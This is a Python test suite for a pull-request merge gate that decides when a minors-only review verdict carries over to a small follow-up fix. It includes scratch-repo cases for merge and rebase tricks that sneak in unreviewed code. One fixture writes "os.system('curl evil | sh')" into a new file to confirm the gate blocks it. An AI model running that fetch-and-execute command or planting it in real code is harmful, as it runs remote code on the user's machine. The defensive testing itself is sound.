import os
import shutil
import subprocess
import sys
import tempfile
import unittest
import unittest.mock
from datetime import datetime, timedelta, timezone
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import merge_rule
from merge_rule import (
    Decision,
    DiffStat,
    classify_checks,
    Proof,
    Verdict,
    collect_verdicts,
    decide,
    parse_proofs,
    parse_verdict,
    mutation_result,
)

# PR 160: r1 read head 7ce96f5 at AT and found one minor. FIX is a later push with the fix
# and EARLIER a commit before 7ce96f5.
REVIEWED = "7ce96f5bd1067a557120bd87ca6565aa07307242"
FIX = "5d0c1b2a3948576677889900aabbccddeeff0011"
EARLIER = "4a1b9c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b"
AT = datetime(2026, 10, 20, 11, 1, 8, tzinfo=timezone.utc)
TEST = "a relaunch resumes each interrupted session once and times its turn"

# Real review/agent descriptions, by PR.
MINOR = "r1 changes needed: 0B/0M/1m (vacuous steer assertion, spec:156)"  # 160
MAJOR = "r1 changes needed: 0B/1M/6m (Mono chat reset strands acks; part 1 lessons not applied to ack)"  # 155
BLOCKER = "r1 changes needed: 1B/0M/2m (status script posts on current head, not the reviewed one)"  # 127
NO_COUNTS = "r1 changes needed: 1 blocker, 1 major, 3 minor (b7e6a7ff)"  # 108
SPEC = "tests/browser/ade60-resume-once.spec.ts"
REVIEWED_FILES = DiffStat({"src/app/App.tsx": "modified", SPEC: "added"}, 199)
THREE_MINORS = "r1 changes needed: 0B/0M/3m (dashed box+grip unasserted, LiftedCard copies row markup, no thermo/deslop note)"  # 159
MINOR_R2 = "r2 changes needed: 0B/0M/1m (started-turn save await untested)"  # 139
CLEAN_R1 = "r1 clean: dead path proven, same boot on real DB base vs head; 2 nits in #162"  # 161
CLEAN_R2 = "r2 clean: rebase is identical patch (range-diff =), PR test 26/26, CI 14/14, nits in #158"  # 156
CLEAN_R5 = "r5 clean: rebase onto a363d977 range-diff all =, integrity 401, 7/7 R5a tests, CI green, 0 open threads"  # 150


def verdict(description, sha=REVIEWED, at=AT):
    parsed = parse_verdict(sha, description, at)
    assert parsed is not None, description
    return parsed


def proven(*findings, at=AT + timedelta(hours=1)):
    return [Proof(finding, TEST, None, at) for finding in findings]


def decide_fix(**changes):
    """decide() for PR 160 at the head FIX: a 3-line fix of its minors-only r1, with proof
    for m1. A test changes one input."""
    inputs = {"tier": "T2", "head": FIX, "verdicts": [verdict(MINOR)], "proofs": proven("m1"), "mutation": None,
              "reviewed_files": REVIEWED_FILES, "since_review": DiffStat({SPEC: "modified"}, 3),
              "checks_failed": [], "checks_pending": [], "review_in_progress": False}
    return decide(**{**inputs, **changes})


class ParseVerdictTest(unittest.TestCase):
    def test_real_descriptions(self):
        expected = {
            "r1 in review": None,
            MINOR: Verdict(REVIEWED, 1, False, 0, 0, 1, AT),
            MAJOR: Verdict(REVIEWED, 1, False, 0, 1, 6, AT),
            CLEAN_R2: Verdict(REVIEWED, 2, True, 0, 0, 0, AT),
            CLEAN_R5: Verdict(REVIEWED, 5, True, 0, 0, 0, AT),
            NO_COUNTS: Verdict(REVIEWED, 1, False, None, None, None, AT),
            "carried from 7ce96f5: minors-only + fixer proof (T3)": None,
        }
        for description, want in expected.items():
            with self.subTest(description=description):
                self.assertEqual(parse_verdict(REVIEWED, description, AT), want)


class ParseProofsTest(unittest.TestCase):
    def test_three_formats(self):
        body = "\r\n".join(
            [
                "Fixes for r1 of #160.",
                f"fixer-proof: m1 test={TEST}",
                "fixer-proof: m2 mutant=M2",
                f"fixer-proof: m3 test={TEST} | mutant=M4",
            ]
        )
        at = datetime(2026, 10, 20, 12, 30, tzinfo=timezone.utc)
        self.assertEqual(
            parse_proofs([{"body": body, "createdAt": "2026-10-20T12:30:00Z", "authorAssociation": "OWNER"}]),
            ([Proof("m1", TEST, None, at), Proof("m2", None, "M2", at), Proof("m3", TEST, "M4", at)], []),
        )

    def test_malformed_lines_are_listed(self):
        malformed = [
            "fixer-proof: m1",
            "fixer-proof: m1 test=",
            "fixer-proof:m1 test=x",
            "fixer-proof: m1 test=x |mutant=M2",
            "fixer-proof: m1 mutant=M2 | test=x",
        ]
        body = "\n".join(["> fixer-proof: m9 test=a quote, not a proof", *malformed, "fixer-proof: m2 mutant=M2"])
        proofs, errors = parse_proofs([{"body": body, "createdAt": "2026-10-20T12:30:00Z", "authorAssociation": "OWNER"}])
        self.assertEqual([proof.finding for proof in proofs], ["m2"])
        self.assertEqual(len(errors), len(malformed))
        for line, error in zip(malformed, errors):
            self.assertIn(f'"{line}"', error)

    def test_only_collaborators_prove(self):
        comment = {"body": f"fixer-proof: m1 test={TEST}", "createdAt": "2026-10-20T12:30:00Z"}
        self.assertEqual(parse_proofs([{**comment, "authorAssociation": "NONE"}]), ([], []))
        self.assertEqual(len(parse_proofs([{**comment, "authorAssociation": "COLLABORATOR"}])[0]), 1)


PR_URL = "https://github.com/tylers2222/Monocode-Unlocked/pull/160"


class CollectVerdictsTest(unittest.TestCase):
    def status(self, description, state="failure", url=PR_URL):
        return {"state": state, "description": description, "created_at": "2026-10-20T11:01:08Z", "target_url": url}

    def test_only_this_prs_non_pending_verdicts(self):
        statuses = {
            REVIEWED: [self.status(MINOR), self.status("r1 in review", "pending")],
            EARLIER: [self.status(MINOR, url="https://github.com/tylers2222/Monocode-Unlocked/pull/159")],
        }
        self.assertEqual(collect_verdicts(statuses, PR_URL), [Verdict(REVIEWED, 1, False, 0, 0, 1, AT)])

    def test_a_pending_status_is_not_a_verdict_even_when_it_reads_as_one(self):
        self.assertEqual(collect_verdicts({REVIEWED: [self.status(CLEAN_R1, "pending")]}, PR_URL), [])


class DecideTest(unittest.TestCase):
    def assertRefused(self, decision, *words):
        self.assertFalse(decision.ok, decision.reason)
        for word in words:
            self.assertIn(word, decision.reason)

    def test_no_verdict_fails(self):
        self.assertEqual(decide_fix(verdicts=[]), Decision(False, False, "no review verdict yet"))

    def test_clean_verdict_on_head_passes(self):
        for tier in ("T1", "T2"):
            with self.subTest(tier=tier):
                self.assertEqual(decide_fix(tier=tier, verdicts=[verdict(CLEAN_R2, sha=FIX)]), Decision(True, False, f"r2 clean on head {FIX[:7]}"))

    def test_latest_verdict_decides(self):
        older = verdict(MAJOR, sha=EARLIER, at=AT - timedelta(hours=2))
        newer = verdict(CLEAN_R2, sha=FIX)
        for verdicts in ([older, newer], [newer, older]):
            with self.subTest(first=verdicts[0].round):
                self.assertTrue(decide_fix(verdicts=verdicts).ok)
        self.assertRefused(decide_fix(verdicts=[verdict(CLEAN_R1, sha=FIX, at=AT - timedelta(hours=2)), verdict(MAJOR, sha=FIX)]), "fix the findings")

    def test_t3_needs_a_green_gate_mutation_on_the_head(self):
        clean = [verdict(CLEAN_R1, sha=FIX)]
        for result in (None, "pending", "failure", "cancelled", "timed_out", "skipped"):
            with self.subTest(result=result):
                self.assertRefused(decide_fix(tier="T3", verdicts=clean, mutation=result), "gate/mutation", result or "missing")
        self.assertTrue(decide_fix(tier="T3", verdicts=clean, mutation="success").ok)

    def test_small_proven_fix_carries_verdict(self):
        self.assertEqual(decide_fix(), Decision(True, True, "carried from 7ce96f5: minors-only + fixer proof (T2)"))

    def test_minors_only_on_head_does_not_carry(self):
        self.assertRefused(decide_fix(verdicts=[verdict(MINOR, sha=FIX)]), f"on head {FIX[:7]}", "push the minor fixes")

    def test_t2_and_t3_carry_only_round_1(self):
        for tier in ("T2", "T3"):
            with self.subTest(tier=tier):
                self.assertRefused(decide_fix(tier=tier, verdicts=[verdict(MINOR_R2)], mutation="success"), "round 1")
        self.assertEqual(decide_fix(tier="T1", verdicts=[verdict(MINOR_R2)]),
                         Decision(True, True, "carried from 7ce96f5: minors-only + fixer proof (T1)"))

    def test_a_change_that_cannot_be_measured_does_not_carry(self):
        self.assertRefused(decide_fix(since_review=DiffStat({}, 0, "has a merge of 3 parents (abc1234)")), "3 parents")

    def test_fix_that_adds_file_needs_new_verdict(self):
        since = DiffStat({SPEC: "modified", "tests/browser/ade60-steer.spec.ts": "added"}, 20)
        self.assertRefused(decide_fix(since_review=since), "new file", "tests/browser/ade60-steer.spec.ts")

    def test_fix_outside_reviewed_files_needs_new_verdict(self):
        since = DiffStat({SPEC: "modified", "src/app/inFlight.ts": "modified"}, 8)
        self.assertRefused(decide_fix(since_review=since), "outside the reviewed diff", "src/app/inFlight.ts")

    def test_fix_may_change_at_most_60_lines(self):
        self.assertTrue(decide_fix(since_review=DiffStat({SPEC: "modified"}, 60)).carry)
        self.assertRefused(decide_fix(since_review=DiffStat({SPEC: "modified"}, 61)), "61 lines")

    def test_t3_carry_needs_green_mutation(self):
        for result in (None, "failure", "cancelled", "skipped"):
            with self.subTest(result=result):
                self.assertRefused(decide_fix(tier="T3", mutation=result), "gate/mutation")
        self.assertTrue(decide_fix(tier="T3", mutation="success").carry)

    def test_failed_or_pending_checks_or_a_review_in_progress_block_carry(self):
        self.assertRefused(decide_fix(checks_failed=["gate/lint"], checks_pending=["browser"]), "failed checks: gate/lint")
        self.assertRefused(decide_fix(checks_pending=["browser", "check (macos-latest)"]), "waiting for checks: browser")
        self.assertRefused(decide_fix(review_in_progress=True), "in progress")

    def test_blocker_or_major_needs_a_new_verdict(self):
        for sha in (REVIEWED, FIX):
            for description in (MAJOR, BLOCKER, NO_COUNTS, "r1 changes needed: 0B/0M/0m (nits only)"):
                with self.subTest(sha=sha, description=description):
                    decision = decide_fix(verdicts=[verdict(description, sha=sha)], proofs=proven("m1", "m2", "m3", "m4", "m5", "m6"))
                    self.assertRefused(decision, "fix the findings")

    def test_clean_verdict_on_older_commit_fails(self):
        self.assertRefused(decide_fix(verdicts=[verdict(CLEAN_R1)]), "new commits")

    def test_each_minor_needs_proof(self):
        decision = decide_fix(verdicts=[verdict(THREE_MINORS)], proofs=proven("m1", "m3"))
        self.assertEqual(decision, Decision(False, False, "no fixer-proof after r1 (7ce96f5) for m2"))

    def test_proof_posted_before_verdict_does_not_count(self):
        self.assertRefused(decide_fix(proofs=proven("m1", at=AT - timedelta(minutes=5))), "no fixer-proof", "m1")
        self.assertRefused(decide_fix(proofs=proven("m1", at=AT)), "no fixer-proof", "m1")


class ClassifyChecksTest(unittest.TestCase):
    def test_failed_and_pending_skip_own_run_and_review(self):
        own = "https://github.com/o/r/actions/runs/77/job/"
        other = "https://github.com/o/r/actions/runs/76/job/"
        runs = [
            {"id": 1, "name": "gate/lint", "status": "completed", "conclusion": "failure", "details_url": other + "1"},
            {"id": 2, "name": "check (macos-latest)", "status": "completed", "conclusion": "cancelled", "details_url": other + "2"},
            {"id": 3, "name": "browser", "status": "in_progress", "conclusion": None, "details_url": other + "3"},
            {"id": 4, "name": "Clean rpm install", "status": "completed", "conclusion": "skipped", "details_url": other + "4"},
            {"id": 5, "name": "host (macos-latest)", "status": "completed", "conclusion": "neutral", "details_url": None},
            {"id": 6, "name": "check (ubuntu-latest)", "status": "completed", "conclusion": "success", "details_url": other + "5"},
            {"id": 7, "name": "gate/integrity", "status": "in_progress", "conclusion": None, "details_url": own + "6"},
            {"id": 8, "name": "gate/tier", "status": "completed", "conclusion": "failure", "details_url": own + "7"},
            {"id": 9, "name": "gate/mutation", "status": "queued", "conclusion": None, "details_url": own + "8"},
        ]
        statuses = [
            {"context": "review/agent", "state": "failure"},
            {"context": "ci/deploy", "state": "pending"},
            {"context": "ci/audit", "state": "error"},
        ]
        self.assertEqual(
            classify_checks(runs, statuses, "77"),
            (["check (macos-latest)", "ci/audit", "gate/lint"], ["browser", "ci/deploy"]),
        )

    def test_only_the_newest_run_of_a_name_counts(self):
        url = "https://github.com/o/r/actions/runs/{}/job/1"
        runs = [
            {"id": 1, "name": "gate/lint", "status": "completed", "conclusion": "cancelled", "details_url": url.format(10)},
            {"id": 2, "name": "gate/lint", "status": "completed", "conclusion": "success", "details_url": url.format(11)},
            {"id": 3, "name": "check", "status": "completed", "conclusion": "success", "details_url": url.format(10)},
            {"id": 4, "name": "check", "status": "completed", "conclusion": "failure", "details_url": url.format(11)},
        ]
        self.assertEqual(classify_checks(runs, [], "99"), (["check"], []))


class MutationResultTest(unittest.TestCase):
    WORKFLOW = ".github/workflows/gate-mutation.yml"

    def run_(self, id_, **changes):
        return {"id": id_, "name": "gate/mutation", "app_id": 15368, "head_sha": FIX, "status": "completed",
                "conclusion": "success", **changes}

    def test_only_a_trusted_run_on_the_head_counts(self):
        paths = {1: self.WORKFLOW, 2: ".github/workflows/other.yml", 3: self.WORKFLOW, 4: self.WORKFLOW}
        untrusted = [self.run_(2), self.run_(3, app_id=1), self.run_(4, head_sha=REVIEWED)]
        self.assertIsNone(mutation_result(untrusted, FIX, paths), "another workflow, another app, an older head")
        self.assertEqual(mutation_result([self.run_(1), *untrusted], FIX, paths), "success")

    def test_the_newest_run_decides_and_a_running_one_is_pending(self):
        paths = {1: self.WORKFLOW, 2: self.WORKFLOW}
        self.assertEqual(mutation_result([self.run_(1), self.run_(2, conclusion="cancelled")], FIX, paths), "cancelled")
        self.assertEqual(mutation_result([self.run_(1), self.run_(2, status="in_progress", conclusion=None)], FIX, paths), "pending")


class MainTest(unittest.TestCase):
    """main() on recorded-shape API answers for PR 160 where the verdict is on the head or
    there is none, so no git runs. gh may only read the PR; any other call fails the test."""

    def run_main(self, statuses, comments=(), tier="T2", check_runs=()):
        answers = {
            "repos/tylers2222/Monocode-Unlocked/pulls/160/commits": [REVIEWED, FIX],
            f"repos/tylers2222/Monocode-Unlocked/commits/{REVIEWED}/statuses": statuses.get(REVIEWED, []),
            f"repos/tylers2222/Monocode-Unlocked/commits/{FIX}/statuses": statuses.get(FIX, []),
            "repos/tylers2222/Monocode-Unlocked/issues/160/comments": list(comments),
            f"repos/tylers2222/Monocode-Unlocked/commits/{FIX}/check-runs": list(check_runs),
            f"repos/tylers2222/Monocode-Unlocked/commits/{FIX}/status": [],
        }
        def gh(*args):
            self.assertEqual(args[:2], ("pr", "view"), "merge_rule.py only reads")
            return f'{{"headRefOid": "{FIX}", "baseRefName": "tyler/main"}}'
        with unittest.mock.patch.object(merge_rule, "api", lambda path, jq, paginate=True: answers[path]), \
                unittest.mock.patch.object(merge_rule, "workflow_path", lambda url: url), \
                unittest.mock.patch.object(merge_rule, "gh", gh), unittest.mock.patch("builtins.print"):
            return merge_rule.main(["160", tier, "--post-carry"])

    MINOR_STATUS = {"state": "failure", "description": MINOR, "created_at": "2026-10-20T11:01:08Z", "target_url": PR_URL}
    CLEAN_STATUS = {"state": "success", "description": "r2 clean: fixed", "created_at": "2026-10-20T13:00:00Z", "target_url": PR_URL}
    PROOF = {"body": f"fixer-proof: m1 test={TEST}", "createdAt": "2026-10-20T12:30:00Z", "authorAssociation": "OWNER"}

    def test_a_clean_verdict_on_the_head_passes(self):
        self.assertEqual(self.run_main({REVIEWED: [self.MINOR_STATUS], FIX: [self.CLEAN_STATUS]}), 0)

    def test_another_prs_verdict_does_not_count(self):
        foreign = {**self.CLEAN_STATUS, "target_url": "https://github.com/tylers2222/Monocode-Unlocked/pull/159"}
        self.assertEqual(self.run_main({FIX: [foreign]}), 1)

    def test_t3_passes_only_on_a_trusted_gate_mutation_run(self):
        statuses = {FIX: [self.CLEAN_STATUS]}
        run = {"id": 5, "name": "gate/mutation", "status": "completed", "conclusion": "success", "head_sha": FIX,
               "app_id": 15368, "details_url": ".github/workflows/gate-mutation.yml"}
        self.assertEqual(self.run_main(statuses, tier="T3", check_runs=[run]), 0)
        self.assertEqual(self.run_main(statuses, tier="T3"), 1, "no run")
        self.assertEqual(self.run_main(statuses, tier="T3", check_runs=[{**run, "details_url": ".github/workflows/ci.yml"}]), 1)


class CarryOnGitTest(unittest.TestCase):
    """main() --post-carry, T2, on real git objects in a scratch repo; only gh and api are
    answered: a minors-only r1 on the reviewed commit and an OWNER fixer-proof after it.
    src/a.py holds the reviewed gate(), 40 one-line functions and a 71-line big(); main then
    adds a top line and other() with 61 audit lines, and changes src/b.py. Each attack of
    the #195 round 3 and round 4 reviews is a case."""

    def git(self, *args, check=True):
        run = subprocess.run(["git", "-C", self.repo, *args], capture_output=True, text=True)
        if check and run.returncode:
            raise AssertionError(f"git {args}: {run.stderr}")
        return run.stdout

    def write(self, path, lines):
        file = Path(self.repo) / path
        file.parent.mkdir(parents=True, exist_ok=True)
        file.write_text("".join(f"{line}\n" for line in lines))

    def read(self, path):
        return (Path(self.repo) / path).read_text().splitlines()

    def commit(self, message):
        self.git("add", "-A")
        self.git("commit", "-qm", message)
        return self.git("rev-parse", "HEAD").strip()

    def setUp(self):
        self.repo = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.repo)
        self.addCleanup(os.chdir, os.getcwd())
        os.chdir(self.repo)  # main() runs git in its working directory
        self.git("init", "-q", "-b", "main")
        self.git("config", "user.email", "t@example.com")
        self.git("config", "user.name", "t")
        self.gate = ["def gate(request):", "    if not request.ok:", "        return deny()", "    return allow()"]
        self.big = ["def big():"] + [f"    step_{n}()" for n in range(70)]
        self.filler = [f"def f{n}(): return {n}" for n in range(40)]
        self.write("src/a.py", self.gate + self.filler + self.big)
        self.write("src/b.py", ["other"])
        self.commit("base")
        self.git("checkout", "-qb", "pr")
        self.write("src/a.py", self.gate[:1] + ["    audit_pr()  # the PR's change"] + self.gate[1:] + self.filler + self.big)
        self.reviewed = self.commit("pr: reviewed")
        self.git("checkout", "-q", "main")
        self.audit = [f"    audit_{n}()" for n in range(61)]
        self.write("src/a.py", ["# main change at the top"] + self.gate + self.filler + self.big + ["def other():"] + self.audit)
        self.write("src/b.py", ["other, changed on main"])
        self.main_tip = self.commit("main adds other()")
        self.git("checkout", "-q", "pr")

    def merge_main(self, edit=None, strategy=()):
        run = subprocess.run(["git", "-C", self.repo, "merge", "-q", "--no-commit", "--no-ff", *strategy, "main"], capture_output=True, text=True)
        if edit:
            edit()
        return self.commit("Merge branch 'main' into pr"), run.returncode

    def run_main(self, head, head_review=None):
        """(exit code, posted, printed) of main() for the head; origin/main is main's tip."""
        self.git("update-ref", "refs/remotes/origin/main", self.git("rev-parse", "main").strip())
        url = "https://github.com/tylers2222/Monocode-Unlocked/pull/195"
        statuses = {self.reviewed: [{"state": "failure", "description": "r1 changes needed: 0B/0M/1m (x)",
                                     "created_at": "2026-10-20T11:00:00Z", "target_url": url}], head: []}
        answers = {
            "repos/tylers2222/Monocode-Unlocked/pulls/195/commits": [self.reviewed, head],
            "repos/tylers2222/Monocode-Unlocked/issues/195/comments": [
                {"body": "fixer-proof: m1 test=test_x", "createdAt": "2026-10-20T12:00:00Z", "authorAssociation": "OWNER"}],
            f"repos/tylers2222/Monocode-Unlocked/commits/{head}/status": [head_review] if head_review else [],
            f"repos/tylers2222/Monocode-Unlocked/commits/{head}/check-runs": [],
        }
        posted, printed = [], []
        def api(path, jq, paginate=True):
            return statuses[path.split("/")[-2]] if path.endswith("/statuses") else answers[path]
        def gh(*args):
            if args[:2] == ("pr", "view"):
                return f'{{"headRefOid": "{head}", "baseRefName": "main"}}'
            posted.append(args)
            return ""
        with unittest.mock.patch.object(merge_rule, "api", api), unittest.mock.patch.object(merge_rule, "gh", gh), \
                unittest.mock.patch("builtins.print", lambda line: printed.append(line)):
            code = merge_rule.main(["195", "T2", "--post-carry"])
        return code, posted, " | ".join(printed)

    def assertCarries(self, head):
        code, posted, printed = self.run_main(head)
        self.assertEqual((code, len(posted)), (0, 1), printed)
        self.assertIn(f"repos/tylers2222/Monocode-Unlocked/statuses/{head}", posted[0])

    def assertBlocks(self, head, *words):
        code, posted, printed = self.run_main(head)
        self.assertEqual((code, posted), (1, []), printed)
        for word in words:
            self.assertIn(word, printed)

    # Plain commits after the review.
    def test_a_60_line_fix_commit_carries_and_a_61_line_one_blocks(self):
        lines = self.read("src/a.py")
        self.write("src/a.py", lines + [f"def fix_{n}(): pass" for n in range(60)])
        self.assertCarries(self.commit("fix: 60 lines"))
        self.write("src/a.py", self.read("src/a.py") + ["def fix_60(): pass"])
        self.assertBlocks(self.commit("fix: one more line"), "61 lines")

    def test_a_fix_in_a_file_outside_the_reviewed_diff_blocks(self):
        self.write("src/b.py", ["other, edited by the fix"])
        self.assertBlocks(self.commit("fix: b.py"), "outside the reviewed diff (src/b.py)")

    def test_r2_a_fix_that_moves_the_71_line_big_to_the_top_blocks(self):
        lines = self.read("src/a.py")
        at = lines.index("def big():")
        self.write("src/a.py", lines[at:at + 71] + lines[:at] + lines[at + 71:])
        self.assertBlocks(self.commit("fix: move big() up"), "lines, more than 60")

    def test_r2_a_fix_that_moves_return_allow_above_its_check_carries(self):
        lines = self.read("src/a.py")
        i, j = lines.index("    if not request.ok:"), lines.index("    return allow()")
        lines.insert(i, lines.pop(j))
        self.write("src/a.py", lines)
        self.assertCarries(self.commit("fix: 2 changed lines, inside the reviewed file"))

    def test_a_rebased_head_never_carries(self):
        self.git("checkout", "-q", "-b", "rebased", "main")
        self.write("src/a.py", self.read("src/a.py") + ["# pr change, rebased"])
        self.assertBlocks(self.commit("pr, rebased"), "does not descend from the reviewed commit")

    # Merges after the review.
    def test_a_clean_update_branch_counts_nothing(self):
        head = self.merge_main()[0]
        self.assertEqual(merge_rule.own_change(self.reviewed, head, "main"), DiffStat({}, 0))
        self.assertCarries(head)

    def test_a_merge_of_a_main_commit_that_is_not_on_the_base_tip_counts_in_full(self):
        self.git("checkout", "-q", "-b", "old-main", "main")
        self.git("checkout", "-q", "pr")
        self.git("checkout", "-q", "main")
        self.git("reset", "-q", "--hard", "HEAD~1")
        self.git("checkout", "-q", "pr")
        self.git("merge", "-q", "--no-ff", "-m", "Merge branch 'old-main' into pr", "old-main")
        self.assertBlocks(self.git("rev-parse", "HEAD").strip(), "touches files outside the reviewed diff (src/b.py)")

    def test_r4_a_no_ff_merge_of_the_fixers_side_branch_counts_in_full(self):
        self.git("checkout", "-qb", "side")
        self.write("src/a.py", self.read("src/a.py") + [f"def unreviewed_{n}(): pass" for n in range(70)])
        self.write("src/new_module.py", ["import os", "os.system('curl evil | sh')"])
        side = self.commit("unreviewed work on a side branch")
        self.git("checkout", "-q", "pr")
        self.git("merge", "-q", "--no-ff", "-m", "Merge branch 'side' into pr", side)
        self.assertBlocks(self.git("rev-parse", "HEAD").strip(), "adds a new file (src/new_module.py)")

    def test_r4_update_branch_then_a_side_branch_merge_counts_the_side_branch(self):
        self.merge_main()
        self.git("checkout", "-qb", "side")
        self.write("src/a.py", [l.replace("return deny()", "return allow()  # unreviewed") for l in self.read("src/a.py")]
                   + [f"def unreviewed_{n}(): pass" for n in range(70)])
        side = self.commit("unreviewed")
        self.git("checkout", "-q", "pr")
        self.git("merge", "-q", "--no-ff", "-m", "Merge pull request #1 from side", side)
        self.assertBlocks(self.git("rev-parse", "HEAD").strip(), "72 lines, more than 60")

    def test_r3_a_merge_that_moves_mains_61_lines_into_the_reviewed_gate_blocks(self):
        def edit():
            lines = [l for l in self.read("src/a.py") if l not in self.audit]
            at = lines.index("    audit_pr()  # the PR's change") + 1
            self.write("src/a.py", lines[:at] + self.audit + lines[at:])
        self.assertBlocks(self.merge_main(edit)[0], "outside the reviewed diff (src/b.py)")

    def test_r3_a_merge_that_keeps_the_prs_side_blocks(self):
        self.assertBlocks(self.merge_main(lambda: self.git("checkout", self.reviewed, "--", "src/a.py"))[0], "outside the reviewed diff (src/b.py)")

    def test_r3_a_merge_that_moves_50_of_mains_lines_into_the_prs_change_blocks(self):
        def edit():
            moved = self.audit[:50]
            lines = [l for l in self.read("src/a.py") if l not in moved]
            at = lines.index("    audit_pr()  # the PR's change") + 1
            self.write("src/a.py", lines[:at] + moved + lines[at:])
        self.assertBlocks(self.merge_main(edit)[0], "outside the reviewed diff (src/b.py)")

    def test_r3_a_one_line_edit_inside_the_merge_counts_the_merge_in_full(self):
        edit = lambda: self.write("src/a.py", [l.replace("step_40()", "step_40(True)") for l in self.read("src/a.py")])
        self.assertBlocks(self.merge_main(edit)[0], "outside the reviewed diff (src/b.py)")

    def test_r3_a_conflict_resolved_by_hand_counts_the_merge_in_full(self):
        self.git("checkout", "-q", "main")
        self.write("src/a.py", [l.replace("if not request.ok:", "if not request.valid:") for l in self.read("src/a.py")])
        self.commit("main edits the line next to the PR's change")
        self.git("checkout", "-q", "pr")
        resolved = (["# main change at the top"] + self.gate[:1] + ["    audit_pr()  # the PR's change", "    if not request.valid:"]
                    + self.gate[2:] + self.filler + self.big + ["def other():"] + self.audit)
        head, code = self.merge_main(lambda: self.write("src/a.py", resolved))
        self.assertNotEqual(code, 0, "git merge reports the conflict")
        self.assertBlocks(head, "outside the reviewed diff (src/b.py)")

    def test_r3_a_merge_with_x_ours_counts_the_merge_in_full(self):
        self.git("checkout", "-q", "main")
        self.write("src/a.py", [l.replace("if not request.ok:", "if not request.valid:") for l in self.read("src/a.py")])
        self.commit("main edits the line next to the PR's change")
        self.git("checkout", "-q", "pr")
        head, code = self.merge_main(strategy=("-X", "ours"))
        self.assertEqual(code, 0, "-X ours merges without a conflict")
        self.assertBlocks(head, "outside the reviewed diff (src/b.py)")

    def test_a_carry_is_posted_once(self):
        head = self.merge_main()[0]
        self.assertCarries(head)
        already = {"context": "review/agent", "state": "success", "description": "carried from " + self.reviewed[:7] + ": minors-only + fixer proof (T2)"}
        self.assertEqual(self.run_main(head, already)[:2], (0, []))


if __name__ == "__main__":
    unittest.main()
